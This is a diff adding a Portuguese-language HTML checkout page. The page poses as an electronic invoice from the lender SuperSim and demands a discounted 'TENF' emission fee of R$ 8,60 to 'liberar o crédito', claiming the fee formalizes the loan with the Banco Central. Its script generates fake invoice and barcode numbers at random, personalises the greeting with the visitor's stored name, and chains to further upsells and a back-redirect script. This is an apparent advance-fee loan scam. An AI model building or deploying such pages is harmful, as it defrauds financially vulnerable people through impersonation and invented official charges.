@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head><script src="/js/meta-pixel.js"></script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4371125873201817&ev=PageView&noscript=1" /></noscript>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Emissão de Nota Fiscal · TENF · SuperSim</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap"
+    rel="stylesheet">
+  <script src="../js/checkout-shared.js"></script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script>
+  <script>
+    !function (f, b, e, v, n, t, s) { if (f.fbq) return; n = f.fbq = function () { n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments) }; if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0'; n.queue = []; t = b.createElement(e); t.async = !0; t.src = v; s = b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t, s) }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js'); fbq('init', '26918311271184563'); fbq('track', 'PageView');
+  </script>
+  <style>
+    :root {
+      --i1: #886827;
+      --i2: #e5b046;
+      --i3: #f8d081;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #312b24;
+      color: #302b26;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 24px 16px
+    }
+
+    .note {
+      font-size: 11px;
+      letter-spacing: 1px;
+      color: #fcdfa5;
+      text-transform: uppercase;
+      font-weight: 700;
+      margin-bottom: 12px;
+      text-align: center
+    }
+
+    .receipt {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      position: relative;
+      filter: drop-shadow(0 24px 40px rgba(0, 0, 0, .45))
+    }
+
+    .receipt::before,
+    .receipt::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: 0;
+      height: 14px;
+      background: radial-gradient(circle at 8px 0, transparent 0 8px, #fff 8px) repeat-x;
+      background-size: 16px 14px
+    }
+
+    .receipt::before {
+      top: -13px
+    }
+
+    .receipt::after {
+      bottom: -13px;
+      transform: rotate(180deg)
+    }
+
+    .rhead {
+      background: var(--i1);
+      color: #fff;
+      padding: 18px 20px;
+      text-align: center
+    }
+
+    .rhead .t {
+      font-weight: 800;
+      font-size: 15px;
+      letter-spacing: .5px
+    }
+
+    .rhead .s {
+      font-size: 11px;
+      opacity: .7;
+      font-family: 'JetBrains Mono', monospace;
+      margin-top: 3px
+    }
+
+    .rbody {
+      padding: 20px
+    }
+
+    h1 {
+      font-size: 20px;
+      font-weight: 800;
+      line-height: 1.3;
+      margin-bottom: 6px
+    }
+
+    h1 b {
+      color: var(--i2)
+    }
+
+    .lead {
+      font-size: 13px;
+      color: #52525b;
+      line-height: 1.55;
+      margin-bottom: 16px
+    }
+
+    .line {
+      display: flex;
+      justify-content: space-between;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      padding: 8px 0;
+      border-bottom: 1px dashed #d4d4d8;
+      color: #3f3f46
+    }
+
+    .line.disc {
+      color: #e5b046;
+      font-weight: 700
+    }
+
+    .total {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 12px;
+      padding: 14px;
+      background: #faf8f3;
+      border-radius: 10px
+    }
+
+    .total .lab {
+      font-size: 12px;
+      color: #f1c263;
+      font-weight: 700
+    }
+
+    .total .v {
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 800;
+      font-size: 26px;
+      color: var(--i1)
+    }
+
+    .total .old {
+      font-size: 12px;
+      color: #a1a1aa;
+      text-decoration: line-through;
+      display: block;
+      text-align: right
+    }
+
+    .btn {
+      margin-top: 18px;
+      width: 100%;
+      border: none;
+      cursor: pointer;
+      background: linear-gradient(135deg, #e5b046, #886827);
+      color: #fff;
+      font-weight: 800;
+      font-size: 16px;
+      padding: 16px;
+      border-radius: 11px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px
+    }
+
+    .barcode {
+      margin-top: 16px;
+      height: 46px;
+      background: repeating-linear-gradient(90deg, #18181b 0 2px, #fff 2px 4px, #18181b 4px 5px, #fff 5px 9px);
+      opacity: .85
+    }
+
+    .bc-num {
+      text-align: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: #71717a;
+      margin-top: 6px;
+      letter-spacing: 1px
+    }
+
+    .foot {
+      margin-top: 18px;
+      text-align: center;
+      font-size: 11px;
+      color: #fcdfa5;
+      line-height: 1.6
+    }
+  </style>
+<script>window.pixelId="6a1079a4c37dc18ff3791d53";var _uax=document.createElement("script");_uax.async=!0;_uax.defer=!0;_uax.src="https://cdn.utmify.com.br/scripts/pixel/pixel.js";document.head.appendChild(_uax);</script><script src="/js/lead-capture.js"></script></head>
+
+<body>
+  <div class="note">⚠ Emissão pendente — não feche</div>
+  <div class="receipt">
+    <div class="rhead">
+      <div class="t">TENF · NOTA FISCAL ELETRÔNICA</div>
+      <div class="s" id="nf">NF-e 000.000.000</div>
+    </div>
+    <div class="rbody">
+      <h1>Emita sua nota e <b>libere o crédito</b><span id="hi"></span></h1>
+      <p class="lead">A TENF formaliza a operação junto ao Banco Central. Como você não concluiu, aplicamos um
+        abatimento único de 50% pra finalizar agora.</p>
+
+      <div class="line"><span>Taxa de Emissão (TENF)</span><span>R$ 17,20</span></div>
+      <div class="line disc"><span>Abatimento único (-50%)</span><span>- R$ 8,60</span></div>
+      <div class="total">
+        <span class="lab">TOTAL A PAGAR</span>
+        <span><span class="old">R$ 17,20</span><span class="v">R$ 8,60</span></span>
+      </div>
+
+      <button class="btn" id="btn">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+          <path d="M9 12h6m-6 4h6M9 8h6M7 3h7l5 5v11a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z" stroke="#fff"
+            stroke-width="1.8" stroke-linejoin="round" />
+        </svg>
+        Emitir nota e pagar R$ 8,60
+      </button>
+
+      <div class="barcode"></div>
+      <div class="bc-num" id="bc"></div>
+    </div>
+  </div>
+  <div class="foot">Documento fiscal eletrônico · SuperSim S.A.<br>CNPJ 33.030.944/0001-60</div>
+  <script>
+    (function () {
+      var r = function (n) { var s = ''; for (var i = 0; i < n; i++)s += Math.floor(Math.random() * 10); return s; };
+      document.getElementById('nf').textContent = 'NF-e ' + r(3) + '.' + r(3) + '.' + r(3);
+      document.getElementById('bc').textContent = r(11) + ' ' + r(11) + ' ' + r(11) + ' ' + r(6);
+      try { var n = (localStorage.getItem('nome') || '').trim(); if (n) document.getElementById('hi').textContent = ', ' + n.split(' ')[0]; } catch (e) { }
+      document.getElementById('btn').addEventListener('click', function () { redirect('up4_ds'); });
+    })();
+  </script>
+  <script src="../js/back-redirect.js?v=4"></script>
+
+  <script src="../js/upsells-shared.js"></script>
+
+</body>
+
+</html>
